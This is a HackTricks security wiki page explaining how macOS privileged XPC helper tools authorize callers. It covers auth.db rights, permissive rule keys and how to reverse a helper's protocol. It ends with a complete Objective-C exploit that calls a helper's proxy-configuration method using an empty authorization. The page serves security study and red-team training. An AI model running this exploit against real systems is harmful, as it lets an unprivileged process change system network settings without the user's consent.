# macOS XPC Authorization

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## XPC Authorization

Apple also proposes another way to authenticate if the connecting process has **permissions to call the an exposed XPC method**.

When an application needs to **execute actions as a privileged user**, instead of running the app as a privileged user it usually installs as root a HelperTool as an XPC service that could be called from the app to perform those actions. However, the app calling the service should have enough authorization.

### ShouldAcceptNewConnection always YES

An example could be found in [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). In `App/AppDelegate.m` it tries to **connect** to the **HelperTool**. And in `HelperTool/HelperTool.m` the function **`shouldAcceptNewConnection`** **won't check** any of the requirements indicated previously. It'll always return YES:

```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
    // Called by our XPC listener when a new connection comes in.  We configure the connection
    // with our protocol and ourselves as the main object.
{
    assert(listener == self.listener);
    #pragma unused(listener)
    assert(newConnection != nil);

    newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
    newConnection.exportedObject = self;
    [newConnection resume];
    
    return YES;
}
```

For more information about how to properly configure this check:

{% content-ref url="macos-xpc-connecting-process-check/" %}
[macos-xpc-connecting-process-check](macos-xpc-connecting-process-check/)
{% endcontent-ref %}

### Application rights

However, there is some **authorization going on when a method from the HelperTool is called**.

The function **`applicationDidFinishLaunching`** from `App/AppDelegate.m` will create an empty authorization reference after the app has started. This should always work.\
Then, it will try to **add some rights** to that authorization reference calling `setupAuthorizationRights`:

```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
    [...]
    err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
    if (err == errAuthorizationSuccess) {
        err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
    }
    if (err == errAuthorizationSuccess) {
        self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
    }
    assert(err == errAuthorizationSuccess);
    
    // If we successfully connected to Authorization Services, add definitions for our default 
    // rights (unless they're already in the database).
    
    if (self->_authRef) {
        [Common setupAuthorizationRights:self->_authRef];
    }
    
    [self.window makeKeyAndOrderFront:self];
}
```

The function `setupAuthorizationRights` from `Common/Common.m` will store in the auth database `/var/db/auth.db` the rights of the application. Note how it will only add the rights that aren't yet in the database:

```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
    // See comment in header.
{
    assert(authRef != NULL);
    [Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
        OSStatus    blockErr;
        
        // First get the right.  If we get back errAuthorizationDenied that means there's 
        // no current definition, so we add our default one.
        
        blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
        if (blockErr == errAuthorizationDenied) {
            blockErr = AuthorizationRightSet(
                authRef,                                    // authRef
                [authRightName UTF8String],                 // rightName
                (__bridge CFTypeRef) authRightDefault,      // rightDefinition
                (__bridge CFStringRef) authRightDesc,       // descriptionKey
                NULL,                                       // bundle (NULL implies main bundle)
                CFSTR("Common")                             // localeTableName
            );
            assert(blockErr == errAuthorizationSuccess);
        } else { 
            // A right already exists (err == noErr) or any other error occurs, we 
            // assume that it has been set up in advance by the system administrator or
            // this is the second time we've run.  Either way, there's nothing more for 
            // us to do.
        }
    }];
}
```

The function `enumerateRightsUsingBlock` is the one used to get applications permissions, which are defined in `commandInfo`:

```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
    static dispatch_once_t sOnceToken;
    static NSDictionary *  sCommandInfo;
    
    dispatch_once(&sOnceToken, ^{
        sCommandInfo = @{
            NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
                kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey", 
                kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow, 
                kCommandKeyAuthRightDesc    : NSLocalizedString(
                    @"EBAS is trying to read its license key.", 
                    @"prompt shown when user is required to authorize to read the license key"
                )
            },
            NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
                kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey", 
                kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin, 
                kCommandKeyAuthRightDesc    : NSLocalizedString(
                    @"EBAS is trying to write its license key.", 
                    @"prompt shown when user is required to authorize to write the license key"
                )
            },
            NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
                kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService", 
                kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow, 
                kCommandKeyAuthRightDesc    : NSLocalizedString(
                    @"EBAS is trying to start its web service.", 
                    @"prompt shown when user is required to authorize to start the web service"
                )
            }
        };
    });
    return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
    // See comment in header.
{
    return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
    // Calls the supplied block with information about each known authorization right..
{
    [self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
        #pragma unused(key)
        #pragma unused(stop)
        NSDictionary *  commandDict;
        NSString *      authRightName;
        id              authRightDefault;
        NSString *      authRightDesc;
        
        // If any of the following asserts fire it's likely that you've got a bug 
        // in sCommandInfo.
        
        commandDict = (NSDictionary *) obj;
        assert([commandDict isKindOfClass:[NSDictionary class]]);

        authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
        assert([authRightName isKindOfClass:[NSString class]]);

        authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
        assert(authRightDefault != nil);

        authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
        assert([authRightDesc isKindOfClass:[NSString class]]);

        block(authRightName, authRightDefault, authRightDesc);
    }];
}
```

This means that at the end of this process, the permissions declared inside `commandInfo` will be stored in `/var/db/auth.db`. Note how there you can find for **each method** that will r**equire authentication**, **permission name** and the **`kCommandKeyAuthRightDefault`**. The later one **indicates who can get this right**.

There are different scopes to indicate who can access a right. Some of them are defined in [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity\_authorization/lib/AuthorizationDB.h) (you can find [all of them in here](https://www.dssw.co.uk/reference/authorization-rights/)), but as summary:

<table><thead><tr><th width="284.3333333333333">Name</th><th width="165">Value</th><th>Description</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Anyone</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Nobody</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Current user needs to be an admin (inside admin group)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Ask user to authenticate.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Ask user to authenticate. He needs to be an admin (inside admin group)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Specify rules</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Specify some extra comments on the right</td></tr></tbody></table>

### Rights Verification

In `HelperTool/HelperTool.m` the function **`readLicenseKeyAuthorization`** checks if the caller is authorized to **execute such method** calling the function **`checkAuthorization`**. This function will check the **authData** sent by the calling process has a **correct format** and then will check **what is needed to get the right** to call the specific method. If all goes good the **returned `error` will be `nil`**:

```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
    [...]

    // First check that authData looks reasonable.
    
    error = nil;
    if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
        error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
    }
    
    // Create an authorization ref from that the external form data contained within.
    
    if (error == nil) {
        err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);
        
        // Authorize the right associated with the command.
        
        if (err == errAuthorizationSuccess) {
            AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
            AuthorizationRights rights   = { 1, &oneRight };

            oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
            assert(oneRight.name != NULL);
            
            err = AuthorizationCopyRights(
                authRef,
                &rights,
                NULL,
                kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
                NULL
            );
        }
        if (err != errAuthorizationSuccess) {
            error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
        }
    }

    if (authRef != NULL) {
        junk = AuthorizationFree(authRef, 0);
        assert(junk == errAuthorizationSuccess);
    }

    return error;
}
```

Note that to **check the requirements to get the right** to call that method the function `authorizationRightForCommand` will just check the previously comment object **`commandInfo`**. Then, it will call **`AuthorizationCopyRights`** to check **if it has the rights** to call the function (note that the flags allow interaction with the user).

In this case, to call the function `readLicenseKeyAuthorization` the `kCommandKeyAuthRightDefault` is defined to `@kAuthorizationRuleClassAllow`. So **anyone can call it**.

### DB Information

It was mentioned that this information is stored in `/var/db/auth.db`. You can list all the stored rules with:

```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```

Then, you can read who can access the right with:

```bash
security authorizationdb read com.apple.safaridriver.allow
```

### Permissive rights

You can find **all the permissions configurations** [**in here**](https://www.dssw.co.uk/reference/authorization-rights/), but the combinations that won't require user interaction would be:

1. **'authenticate-user': 'false'**
   * This is the most direct key. If set to `false`, it specifies that a user does not need to provide authentication to gain this right.
   * This is used in **combination with one of the 2 below or indicating a group** the user must belong to.
2. **'allow-root': 'true'**
   * If a user is operating as the root user (which has elevated permissions), and this key is set to `true`, the root user could potentially gain this right without further authentication. However, typically, getting to a root user status already requires authentication, so this isn't a "no authentication" scenario for most users.
3. **'session-owner': 'true'**
   * If set to `true`, the owner of the session (the currently logged-in user) would automatically get this right. This might bypass additional authentication if the user is already logged in.
4. **'shared': 'true'**
   * This key doesn't grant rights without authentication. Instead, if set to `true`, it means that once the right has been authenticated, it can be shared among multiple processes without each one needing to re-authenticate. But the initial granting of the right would still require authentication unless combined with other keys like `'authenticate-user': 'false'`.

You can [**use this script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) to get the interesting rights:

```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```

## Reversing Authorization

### Checking if EvenBetterAuthorization is used

If you find the function: **`[HelperTool checkAuthorization:command:]`** it's probably the the process is using the previously mentioned schema for authorization:

<figure><img src="../../../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

Thisn, if this function is calling functions such as `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, it's using [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Check the **`/var/db/auth.db`** to see if it's possible to get permissions to call some privileged action without user interaction.

### Protocol Communication

Then, you need to find the protocol schema in order to be able to establish a communication with the XPC service.

The function **`shouldAcceptNewConnection`** indicates the protocol being exported:

<figure><img src="../../../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

In this case, we have the same as in EvenBetterAuthorizationSample, [**check this line**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Knowing, the name of the used protocol, it's possible to **dump its header definition** with:

```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```

Lastly, we just need to know the **name of the exposed Mach Service** in order to stablish a communication with it. There are several ways to find this:

* In the **`[HelperTool init]`** where you can see the Mach Service being used:

<figure><img src="../../../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

* In the launchd plist:

```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

	<key>MachServices</key>
	<dict>
		<key>com.example.HelperTool</key>
		<true/>
	</dict>
[...]
```

### Exploit Example

In this example is created:

* The definition of the protocol with the functions
* An empty auth to use to to ask for access
* A connection to the XPC service
* A call to the function if the connection was successful

```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
    NSData *authData;
    OSStatus status;
    AuthorizationExternalForm authForm;
    AuthorizationRef authReference = {0};
    NSString *proxyAddress = @"127.0.0.1";
    NSString *proxyPort = @"4444";
    Boolean isProxyEnabled = true;
     
    // Create an empty authorization reference
    status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
    const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
    NSLog(@"OSStatus: %s", errorMsg);
    
    // Convert the authorization reference to an external form
    if (status == errAuthorizationSuccess) {
        status = AuthorizationMakeExternalForm(authReference, &authForm);
        errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
        NSLog(@"OSStatus: %s", errorMsg);
    }
    
    // Convert the external form to NSData for transmission
    if (status == errAuthorizationSuccess) {
        authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
        errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
        NSLog(@"OSStatus: %s", errorMsg);
    }
    
    // Ensure the authorization was successful
    assert(status == errAuthorizationSuccess);
     
    // Establish an XPC connection
    NSString *serviceName = XPCServiceName;
    NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
    NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
    [xpcConnection setRemoteObjectInterface:xpcInterface];
    [xpcConnection resume];

    // Handle errors for the XPC connection
    id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
        NSLog(@"[-] Connection error");
        NSLog(@"[-] Error: %@", error);
    }];

    // Log the remote proxy and connection objects
    NSLog(@"Remote Proxy: %@", remoteProxy);
    NSLog(@"XPC Connection: %@", xpcConnection);

    // Use the legacy method to configure the proxy
    [remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
        NSLog(@"Response: %@", error);
    }];
         
    // Allow some time for the operation to complete
    [NSThread sleepForTimeInterval:10.0f];
    
    NSLog(@"Finished!");
}
```

## Other XPC privilege helpers abused

* [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm\_source=pocket\_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm\_source=pocket\_shared)

## References

* [https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/](https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
